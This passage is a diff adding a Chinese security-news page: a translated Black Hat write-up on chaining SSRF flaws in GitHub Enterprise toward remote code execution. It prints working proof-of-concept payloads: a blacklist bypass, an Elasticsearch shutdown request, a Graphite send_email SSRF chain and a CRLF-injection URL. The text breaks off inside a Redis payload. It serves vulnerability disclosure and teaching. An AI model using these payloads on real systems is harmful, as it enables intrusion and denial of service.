@@ -1,0 +1,663 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【Blackhat】从SSRF执行链到RCE，看我如何利用GitHub企业版中的四个漏洞 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="SSRF,GitHub"/>
+    
+        <meta name="description" content="在这篇文章中，我将会告诉大家如何将四个漏洞串联起来并且最终在GitHub上实现了远程代码执行。值得一提的是，这份漏洞报告也荣获了GitHub第三届漏洞奖励周年评选中的最佳漏洞报告。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【Blackhat】从SSRF执行链到RCE，看我如何利用GitHub企业版中的四个漏洞</h2>
+                <div class="article-msg">
+                    <span class="time">2017-07-31 15:33:09</span>
+                    
+                                        <span class="read">阅读：17748次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4176"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4176" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html"
+                             target="_blank">来源： blog.orange.tw</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2606963099" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01d4bd8d816ed27ddd.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2606963099" style="color:#848e99;">WisFree</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="white-space: normal; text-align: center;"><img src="http://p1.qhimg.com/t01d0b41dae9e5406e0.png" title="t019ad629361e767bee.png" alt="http://p2.qhimg.com/t019ad629361e767bee.png"/></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);"><span style="text-indent: 32px; font-weight: 900; font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：<a href="http://blog.orange.tw/" target="_self" style="color: rgb(0, 112, 192);">Orange Tsai&nbsp;</a></span><span style="color: rgb(70, 79, 85); font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background-color: rgb(255, 255, 255);">&nbsp; </span>译者：</span><a href="http://bobao.360.cn/member/contribute?uid=2606963099" target="_blank"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">WisFree</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="white-space: normal;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">写在前面的话</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在过去的几个月里，我一直都在认真准备2017年美国Black Hat黑客大会以及DEF CON 25的演讲内容，而成为一个Black Hat以及DEFCON的演讲者一直都是我人生中的一个非常重要的目标。除此之外，这也是我第一次在如此正式的场合下进行英文演讲，这绝对是一个值得回忆并且能够得瑟一辈子的事情！</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这篇文章中，我将会给大家简单介绍我的演讲内容。这里所使用的技术虽然不是什么新技术，但是这些旧的技术依然非常的强大。如果你对我的演讲感兴趣的话，可以点击<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);"><strong>【</strong></span></span><a style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline; color: rgb(227, 108, 9);"><span style="color: rgb(227, 108, 9);"><strong>这里</strong></span></a><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">】</span></strong></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取幻灯片。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注：幻灯片中介绍了很多关于&nbsp;SSRF(Server-Side Request Forgery:服务器端请求伪造)&nbsp;的功能强大的新方法。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">直奔主题</span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这篇文章中，我将会告诉大家如何将四个漏洞串联起来并且最终在GitHub上实现了远程代码执行。值得一提的是，这份漏洞报告也荣获了GitHub第三届漏洞奖励周年评选中的</span><a style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline; color: rgb(227, 108, 9);"><span style="color: rgb(227, 108, 9);"><strong>最佳漏洞报告</strong></span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在我上一篇文章中，我提到了一个新的目标- GitHub&nbsp;Enterprise服务（GitHub企业版），并且我还介绍了如何反混淆GitHub的Ruby代码以及如何找出其中存在的SQL注入漏洞。在此之后，我发现有很多赏金猎人也开始将注意力转移到了GitHub&nbsp;Enterprise服务的身上，并且还找到了很多有意思的安全漏洞【</span><a href="http://www.economyofmechanism.com/github-saml" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考漏洞一</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">】【</span><a href="http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考漏洞二</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">】。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看到了这些WriteUp之后，我就很烦躁了，为什么我当初就没发现这些漏洞呢？？因此，我自己暗下决心，我一定要找到一个高危漏洞!</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞描述</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在我检查GitHub Enterprise服务的架构之前，我的直觉告诉我，GitHub Enterprise中还存在很多很多的内部服务。如果我可以利用这些内部服务的话，我相信我绝对可以找到很多有意思的东西。</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来，所有的注意力我都会放在&nbsp;SSRF(Server-Side Request Forgery:服务器端请求伪造)&nbsp;漏洞的身上。</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一个漏洞-无害的SSRF</span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在寻找GitHub Enterprise漏洞的过程中，我发现了一个名叫WebHook的功能。这个功能非常有趣，当出现了特定的GIT命令时，它允许我们设置一个自定义的HTTP回调。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你可以使用下面给出的URL地址创建一个HTTP回调：</span></p><pre class="brush:plain;toolbar:false">https://&lt;host&gt;/&lt;user&gt;/&lt;repo&gt;/settings/hooks/new</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后通过提交文件来触发回调。接下来，GitHub Enterprise将会通过一个HTTP请求来通知用户。下面给出的Payload和HTTP请求的样本：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Payload URL：</span></p><pre class="brush:plain;toolbar:false">http://orange.tw/foo.php</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">回调请求：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">POST&nbsp;/foo.php&nbsp;HTTP/1.1
+Host:&nbsp;orange.tw
+Accept:&nbsp;*/*
+User-Agent:&nbsp;GitHub-Hookshot/54651ac
+X-GitHub-Event:&nbsp;ping
+X-GitHub-Delivery:&nbsp;f4c41980-e17e-11e6-8a10-c8158631728f
+content-type:&nbsp;application/x-www-form-urlencoded
+Content-Length:&nbsp;8972
+payload=...</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">GitHub Enterprise使用了RubyGem faraday来获取外部资源，并防止用户通过Gem faraday-restrict-ip-addresses来请求内部服务。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这里，Gem就像是一个黑名单一样，我们可以通过RFC 3986定义的稀有IP地址格式（Rare IP Address Formats）来绕过这个黑名单。在Linux系统中，&quot;0&quot;代表的是&quot;localhost&quot;。</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PoC：</span></p><pre class="brush:plain;toolbar:false">http://0/</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">非常好，现在我们已经拿到了一个SSRF漏洞了。但是，我们仍然什么都做不了，这是为什么呢？</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因为这个SSRF有以下几种限制：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1. 只支持POST方法；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2. 只运行HTTP和HTTPS模式；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3. 没有302重定向；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4. faraday中没有CR-LF命令注入；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5. 无法控制POST数据和HTTP头；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们唯一能够控制的就是其中的Path部分。但值得一提的是，这个SSRF漏洞可以导致拒绝服务攻击（DoS）。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在GitHub Enterprise中，端口9200绑定了一个弹性搜索服务，在后台使用关机命令的时候，该服务并不会关心其中的POST数据到底是什么内容。因此，我们就可以随意对它的REST-ful API进行操作了！</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">拒绝服务攻击PoC：</span></p><pre class="brush:plain;toolbar:false">http://0:9200/_shutdown/</pre><p style="white-space: normal; text-indent: 2em;"><br/></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 18px;">第二个漏洞-内部Graphite中的SSRF</span></strong><br/></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 18px;"></span></strong></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们已经拿到了一个SSRF漏洞，但这个漏洞限制那么多，想要直接利用它估计是很困难的，所以接下来我打算找找看是否还有其他的内部服务是可以被我们利用的。这可是一个大工程，因为在GitHub Enterprise中还有很多的HTTP服务，而每一个服务很可能都是采用不同的编程语言实现的，例如C/C++、Go、Python以及Ruby等等。在研究了好几天之后，我发现了一个名叫Graphite的服务，该服务绑定的端口号为8000。Graphite服务是一个高度可伸缩的实时图形系统，而GitHub需要使用这个系统来给用户显示某些图形化的统计数据。</span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Graphite采用Python语言开发，并且它本身也是一个开源项目，你可以点击<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);"><strong>【</strong></span></span><a href="https://github.com/graphite-project/graphite-web" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9); text-decoration: underline;"><span style="color: rgb(227, 108, 9);"><strong>这里</strong></span></a><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">】</span></strong></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取Graphite项目的源代码。阅读了Graphite的源代码之后，我迅速地发现了另一个SSRF。第二个SSRF比较简单，这个漏洞存在于webapps/graphite/composer/views.py文件之中：</span></p><pre class="brush:plain;toolbar:false">def&nbsp;send_email(request):
+&nbsp;&nbsp;&nbsp;&nbsp;try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recipients&nbsp;=&nbsp;request.GET[&#39;to&#39;].split(&#39;,&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;request.GET[&#39;url&#39;]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proto,&nbsp;server,&nbsp;path,&nbsp;query,&nbsp;frag&nbsp;=&nbsp;urlsplit(url)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;query:&nbsp;path&nbsp;+=&nbsp;&#39;?&#39;&nbsp;+&nbsp;query
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;=&nbsp;HTTPConnection(server)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.request(&#39;GET&#39;,path)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resp&nbsp;=&nbsp;conn.getresponse()
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你可以看到，</span><strong style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><span style="color: rgb(247, 150, 70);">Graphite</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">会接受用户输入的</span><strong style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><span style="color: rgb(247, 150, 70);">url</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">地址，然后直接进行资源请求！所以，我们就可以利用第一个SSRF漏洞来触发第二个SSRF漏洞，并将它们两个漏洞组合成一个SSRF执行链。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">SSRF执行链Payload：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">http://0:8000/composer/send_email?
+to=orange@nogg&amp;
+url=http://orange.tw:12345/foo</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二个SSRF的请求：</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;nc&nbsp;-vvlp&nbsp;12345
+...
+&nbsp;
+GET&nbsp;/foo&nbsp;HTTP/1.1
+Host:&nbsp;orange.tw:12345
+Accept-Encoding:&nbsp;identity</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们已经成功地将这个基于POST的SSRF改成了基于GET的SSRF了。但是，我们还是没办法利用这个漏洞去做任何事情。所以我们还得继续努力...</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第三个漏洞-Python中的CRLF注入</span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你可以从Graphite的源码中看到，Graphite使用了Python的httplib.HTTPConnection来获取资源。在进行了一番研究之后，我发现在httplib.HTTPConnection竟然存在一个CR-LF命令注入漏洞。因此，我们就可以在HTTP协议中嵌入恶意的Payload了。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CR-LF注入PoC：</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">http://0:8000/composer/send_email?
+to=orange@nogg&amp;
+url=http://127.0.0.1:12345/%0D%0Ai_am_payload%0D%0AFoo:
+&nbsp;
+$&nbsp;nc&nbsp;-vvlp&nbsp;12345
+...
+&nbsp;
+GET&nbsp;/
+i_am_payload
+Foo:&nbsp;HTTP/1.1
+Host:&nbsp;127.0.0.1:12345
+Accept-Encoding:&nbsp;identity</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">虽然这看起来我们貌似只前进了一小步，但对于整个漏洞利用链来说却是非常大的进步。现在，我已经可以在这个SSRF漏洞执行链中引入其他的协议了。比如说，如果我想对其中的Redis动手，我们就可以尝试使用下列Payload：</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">http://0:8000/composer/send_email?
+to=orange@nogg&amp;
